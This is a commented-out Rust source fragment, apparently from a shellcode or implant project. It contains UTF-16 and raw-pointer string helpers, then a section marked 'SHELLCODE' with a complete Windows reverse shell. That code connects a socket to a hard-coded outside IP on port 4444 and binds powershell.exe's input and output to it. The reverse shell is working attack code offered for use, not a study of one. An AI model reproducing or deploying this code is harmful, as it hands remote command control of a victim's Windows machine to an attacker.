// pub unsafe fn unicode_ptr_to_string(ptr: *const u16) -> String {
//     let mut buf = ptr;
//     let mut s = String::new();
//     while *buf != 0 {
//         s.push(char::from_u32((*buf).into()).unwrap());
//         buf = buf.offset(1);
//     }
//     s
// }

// pub unsafe fn u16_contains_str(normal_string: &str, bullshit_string: *const u16) -> bool {
//     let normal_slice = normal_string.as_bytes();
//     let bullshit_slice = core::slice::from_raw_parts(
//         bullshit_string,
//         (0..)
//             .take_while(|&i| *bullshit_string.offset(i) != 0)
//             .count(),
//     );
//     if bullshit_slice.len() < normal_string.len() {
//         return false;
//     }
//     let mut cx = 0;
//     for i in 0..bullshit_slice.len() {
//         if char::from_u32((bullshit_slice[i]).into())
//             .unwrap()
//             .to_lowercase()
//             .any(|c| c == normal_slice[cx] as char)
//         {
//             cx += 1;
//             if cx == normal_slice.len() {
//                 return true;
//             }
//         } else {
//             cx = 0;
//         }
//     }
//     return false;
// }

// unsafe fn slicify<'a, T: PartialEq + Default>(ptr: *const T) -> &'a [T] {
//     core::slice::from_raw_parts(
//         ptr,
//         (0..)
//             .take_while(|&i| *ptr.offset(i) != T::default())
//             .count(),
//     )
// }
//
// pub unsafe fn equal_pointers<T: PartialEq + Default>(st: *const T, nd: *const T) -> bool {
//     equal_slices(slicify(st), slicify(nd))
// }
//
// pub unsafe fn contains<T: PartialEq + Default>(context: *const T, subject: *const T) -> bool {
//     let s_slc = slicify(subject);
//     slicify(context)
//         .windows(s_slc.len())
//         .any(|w| equal_slices(w, s_slc))
// }
//
// fn equal_slices<T: PartialEq>(context: &[T], subject: &[T]) -> bool {
//     if context.len() != subject.len() {
//         return false;
//     }
//     context.iter().zip(subject.iter()).all(|(a, b)| a == b)
// }

///// SHELLCODE
// type WSAStartupFn = extern "system" fn(wVersionRequested: u16, lpWSAData: *mut WSADATA) -> i32;
// type WSACleanupFn = extern "system" fn() -> i32;
// type WSASocketAFn = extern "system" fn(
//     af: i32,
//     type_: i32,
//     protocol: i32,
//     lpProtocolInfo: *mut WSAPROTOCOL_INFOA,
//     g: u32,
//     dwFlags: u32,
// ) -> SOCKET;
// type htonsFn = extern "system" fn(hostshort: u16) -> u16;
// type inet_addrFn = extern "system" fn(cp: *const i8) -> u32;
// type connectFn = extern "system" fn(s: SOCKET, name: *const SOCKADDR, namelen: i32) -> i32;
// type closesocketFn = extern "system" fn(s: SOCKET) -> i32;
// type CreateProcessAFn = extern "system" fn(
//     lpApplicationName: PCSTR,
//     lpCommandLine: PSTR,
//     lpProcessAttributes: *mut c_void,
//     lpThreadAttributes: *mut c_void,
//     bInheritHandles: i32,
//     dwCreationFlags: u32,
//     lpEnvironment: *mut c_void,
//     lpCurrentDirectory: *mut c_void,
//     lpStartupInfo: *mut STARTUPINFOA,
//     lpProcessInformation: *mut PROCESS_INFORMATION,
// ) -> i32;

// Reverse shell
// let mut wsa_data: WSADATA = core::mem::MaybeUninit::zeroed().assume_init();
// if WSAStartup(0x202, &mut wsa_data) != 0 {
//     panic!("Unable to call WSAStartup")
// }
//
// let socket = WSASocketA(
//     AF_INET as i32,
//     SOCK_STREAM,
//     IPPROTO_TCP,
//     core::ptr::null_mut(),
//     0,
//     0,
// );
//
// let mut sockaddr_in: SOCKADDR_IN = core::mem::MaybeUninit::zeroed().assume_init();
// sockaddr_in.sin_addr.S_un.S_addr = inet_addr("37.187.111.163\0".as_ptr() as *const i8);
// sockaddr_in.sin_family = AF_INET;
// sockaddr_in.sin_port = htons(4444);
//
// if connect(
//     socket,
//     &sockaddr_in as *const SOCKADDR_IN as *const SOCKADDR,
//     core::mem::size_of::<SOCKADDR_IN>() as i32,
// ) != 0
// {
//     panic!("Unable to call connect to the remote socket")
// }
//
// let mut buf = [0u8; 1024];
// recv(socket, buf.as_mut_ptr(), buf.len() as i32, 0);
// WriteConsoleA(
//     GetStdHandle(windows_sys::Win32::System::Console::STD_OUTPUT_HANDLE),
//     buf.as_ptr() as *const c_void,
//     buf.len() as u32,
//     core::ptr::null_mut(),
//     core::ptr::null_mut(),
// );
// let mut si: STARTUPINFOA = core::mem::MaybeUninit::zeroed().assume_init();
// si.cb = core::mem::size_of::<STARTUPINFOA>() as u32;
// si.dwFlags = STARTF_USESTDHANDLES;
// si.hStdInput = socket as windows_sys::Win32::Foundation::HANDLE;
// si.hStdOutput = socket as windows_sys::Win32::Foundation::HANDLE;
// si.hStdError = socket as windows_sys::Win32::Foundation::HANDLE;
// let mut pi: PROCESS_INFORMATION = core::mem::MaybeUninit::zeroed().assume_init();
// let cmd = "powershell.exe\0";
// CreateProcessA(
//     core::ptr::null_mut(),
//     cmd.as_ptr() as PSTR,
//     core::ptr::null_mut(),
//     core::ptr::null_mut(),
//     1,
//     0,
//     core::ptr::null_mut(),
//     core::ptr::null_mut(),
//     &mut si,
//     &mut pi,
// );
//
// closesocket(socket);
//
// if WSACleanup() != 0 {
//     panic!("Unable to call WSACleanup")
// }
/////
